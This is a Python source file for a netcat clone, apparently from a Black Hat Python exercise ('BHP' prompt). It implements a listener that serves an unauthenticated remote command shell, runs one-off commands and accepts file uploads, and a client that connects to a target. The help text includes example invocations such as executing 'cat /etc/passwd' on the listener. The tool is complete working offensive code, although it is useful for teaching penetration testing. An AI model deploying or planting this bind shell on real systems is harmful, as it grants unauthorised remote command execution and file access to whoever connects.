import sys
import shlex
import socket
import textwrap
import argparse
import threading
import subprocess


def execute(cmd):
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd),
                                     stderr=subprocess.STDOUT)
    return output.decode()


class Netcat(object):
    def __init__(self, arguments, bffer=None):
        self.arguments = arguments
        self.bffer = bffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def run(self):
        if self.arguments.listen:
            self.listen()
        else:
            self.send()

    def handle(self, client_socket):
        if self.arguments.execute:
            output = execute(self.arguments.execute)
            client_socket.send(output.encode())
        elif self.arguments.upload:
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break
            with open(self.arguments.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.arguments.upload}'
            client_socket.send(message.encode())

        elif self.arguments.command:
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())
                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

    def listen(self):
        self.socket.bind((self.arguments.target, self.arguments.port))
        self.socket.listen(5)
        while True:
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(target=self.handle, args=(client_socket,))
            client_thread.start()

    def send(self):
        self.socket.connect((self.arguments.target, self.arguments.port))
        if self.bffer:
            self.socket.send(self.bffer)

        try:
            while True:
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break
                if response:
                    print(response)
                    bffer = input('> ')
                    bffer += '\n'
                    self.socket.send(bffer.encode())
        except KeyboardInterrupt:
            print('User terminated')
            self.socket.close()
            sys.exit()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='BHP NetCAT tool',
                                     formatter_class=argparse.ArgumentDefaultsHelpFormatter,
                                     epilog=textwrap.dedent("""Example: 2
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -c #
                                                            command shell
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -
                                                            u=mytest.txt # upload to file
                                                            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat
                                                            /etc/passwd\" # execute command
                                                            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135
                                                            # echo text to server port 135
                                                            netcat.py -t 192.168.1.108 -p 5555 # connect to
                                                            server"""))

    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, help='listening port')
    parser.add_argument('-t', '--target', default='192.168.2.145', help='target IP')
    parser.add_argument('-u', '--upload', help='upload file')

    args = parser.parse_args()

    if args.listen:
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = Netcat(args, buffer.encode())
    nc.run()
